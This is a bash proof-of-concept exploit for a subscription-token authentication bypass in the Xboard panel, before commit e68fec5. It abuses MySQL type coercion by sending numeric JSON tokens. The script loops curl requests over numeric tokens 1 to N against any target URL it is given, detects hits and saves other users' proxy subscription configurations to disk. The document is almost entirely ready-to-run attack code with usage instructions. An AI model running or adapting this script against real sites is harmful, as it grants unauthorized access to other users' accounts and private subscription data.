#!/usr/bin/env bash
#
# Xboard <= e68fec5^ Subscription Token Authentication Bypass PoC (general-purpose)
# made by @pingzicloud1234
#
# How it works: the old Client middleware reads $request->input('token') without
# validating its type, then calls User::where('token', $token)->first() directly.
# Sending the token as a JSON number in the body gives PHP an int. When comparing
# it against CHAR(32), MySQL converts the column value to a number, so token=44155
# matches all "44155xxxx..." tokens and returns an arbitrary matching record
# (first()), without requiring the full token.
#
# Use the request body with an unquoted number: query parameters are strings,
# so MySQL compares them as strings and finds no match. token=0 returns 403
# because empty(0) is true in the old code, so start at 1.

set -uo pipefail

PROG="${0##*/}"
URL=''
PATH_OVERRIDE='/api/v1/client/subscribe'
FLAG='clashmeta'
MAX=99
INSECURE=0
SAVE=1
VERBOSE=0
OUTDIR="./out"

usage() {
  cat <<EOF
Usage: $PROG -u https://target.com [options]

  -u URL     Target site's base URL (required, e.g. https://example.com)
  -p PATH    Subscription endpoint path (default: /api/v1/client/subscribe)
  -f FLAG    Subscription format (default: clashmeta; alternatives: clash/singbox/surge/v2ray)
  -n NUM     Maximum numeric token; try 1 through NUM (default: 99; larger is slower but more thorough)
  -o DIR     Directory for saving matching responses (default: ./out)
  -k         Ignore TLS certificate errors
  -v         Show every failed request
  -h         Show help

Exit codes: 0=vulnerable, 1=no hits/patched, 2=invalid arguments

Examples:
  $PROG -u https://example.com
  $PROG -u https://example.com -f singbox -n 999

made by @pingzicloud1234
EOF
}

while getopts ':u:p:f:n:o:kvh' opt; do
  case "$opt" in
    u) URL="$OPTARG" ;;
    p) PATH_OVERRIDE="$OPTARG" ;;
    f) FLAG="$OPTARG" ;;
    n) MAX="$OPTARG" ;;
    o) OUTDIR="$OPTARG" ;;
    k) INSECURE=1 ;;
    v) VERBOSE=1 ;;
    h) usage; exit 0 ;;
    :) echo "$PROG: -$OPTARG requires an argument" >&2; usage; exit 2 ;;
    *) echo "$PROG: unknown option -$OPTARG" >&2; usage; exit 2 ;;
  esac
done

[ -n "$URL" ] || { usage; exit 2; }
case "$MAX" in ''|*[!0-9]*) echo "$PROG: -n must be a positive integer" >&2; exit 2 ;; esac
[ "$MAX" -ge 1 ] || { echo "$PROG: -n must be >= 1" >&2; exit 2; }

URL="${URL%/}"
ENDPOINT="$URL/${PATH_OVERRIDE#/}"
UA='ClashforWindows/0.20.27'
CURL=(-sS --max-time 20 -H "User-Agent: $UA")
[ "$INSECURE" = 1 ] && CURL+=(-k)
[ "$SAVE" = 1 ] && mkdir -p "$OUTDIR"

looks_like_sub() {
  grep -aqE '^(proxies:|proxy-groups:|proxy-providers:|\[server\]|[A-Za-z0-9+]+://)' "$1" 2>/dev/null
}

echo "[*] by     : @pingzicloud1234"
echo "[*] target : $ENDPOINT"
echo "[*] payload: GET + JSON body {\"token\": <number>, \"flag\": \"$FLAG\"}"
echo "[*] range  : 1..$MAX"
echo

hit=0
tried=0
SECONDS=0

for n in $(seq 1 "$MAX"); do
  tried=$((tried + 1))
  body="$OUTDIR/token_$n.txt"
  [ "$SAVE" = 1 ] || body="$(mktemp)"

  code=$(curl "${CURL[@]}" -o "$body" -w '%{http_code}' \
    -X GET "$ENDPOINT" \
    -H 'Content-Type: application/json' \
    --data-raw "{\"token\":$n,\"flag\":\"$FLAG\"}") || code='000'

  size=$(wc -c < "$body" 2>/dev/null | tr -d ' ')
  size=${size:-0}

  if [ "$code" = '200' ] && [ "$size" -gt 0 ]; then
    hit=$((hit + 1))
    if looks_like_sub "$body"; then
      primary=$(grep -aom1 -E '^\s*-?\s*name:.*|^\s*#.*' "$body" | sed 's/^[[:space:]]*//' | cut -c1-60)
      printf '  [HIT] token=%-5s -> 200  %6s bytes  %s\n' "$n" "$size" "${primary:-<subscription>}"
    else
      printf '  [?]   token=%-5s -> 200  %6s bytes  (content does not look like a subscription)\n' "$n" "$size"
    fi
    [ "$SAVE" = 1 ] || cp "$body" "./token_$n.txt"
  else
    [ "$SAVE" = 1 ] && rm -f "$body"
    if [ "$VERBOSE" = 1 ]; then
      printf '  [ ]   token=%-5s -> %s\n' "$n" "$code"
    elif [ $((tried % 25)) -eq 0 ]; then
      printf '  ... %s/%s\n' "$tried" "$MAX"
    fi
  fi
  [ "$SAVE" = 1 ] || rm -f "$body"
done

echo
if [ "$hit" -gt 0 ]; then
  echo "[!] VULNERABLE: $hit numeric tokens matched in $tried requests, elapsed ${SECONDS}s"
  echo "    Matching responses contain arbitrary users' subscriptions; after patching, all these requests should return 403."
  [ "$SAVE" = 1 ] && echo "    Content saved to $OUTDIR/  (instance configuration is stored here only, not in the script)"
  exit 0
fi

echo "[+] No hits: none of the $tried requests returned a subscription, elapsed ${SECONDS}s"
echo "    - e68fec5 and later: expected result; the vulnerability is patched."
echo "    - If an older version still fails: the site may not be Xboard, a WAF may be present, or all numeric prefixes may exceed $MAX; increase -n and try again."
echo "    - Add -v to see status codes, or use a valid full token to verify that the endpoint works."
exit 1
